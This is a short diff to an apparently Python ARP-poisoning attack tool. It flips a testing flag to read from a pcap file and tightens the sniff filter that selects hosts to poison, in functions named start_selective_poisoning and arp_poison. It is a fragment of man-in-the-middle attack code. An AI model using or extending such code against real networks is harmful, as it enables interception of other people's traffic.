@@ -35,7 +35,7 @@ debug = False
 terminateonfail = False
 
 # for testing only, to set to false when running attack
-usepcapfile = False
+usepcapfile = True
 spoison = False
 nosubinter = False
 
@@ -283,7 +283,7 @@ def start_selective_poisoning(packet):
         print("[DEBUG] Poisoning router to get return packets")
         print(f"[DEBUG] Silent mode: {silentmode}")
     routerIP = packet[IP].src
-    filterstring = f"(tcp or udp) and src host not ({routerIP} or 0.0.0.0) and ether src host not {mymac} and src net {mynetwork}"
+    filterstring = f"ip and (tcp or udp) and src host not ({routerIP} or 0.0.0.0) and ether src host not {mymac} and src net {mynetwork} and not ip multicast"
     sniff(prn=arp_poison, filter=filterstring)
 
 def arp_poison(packet):
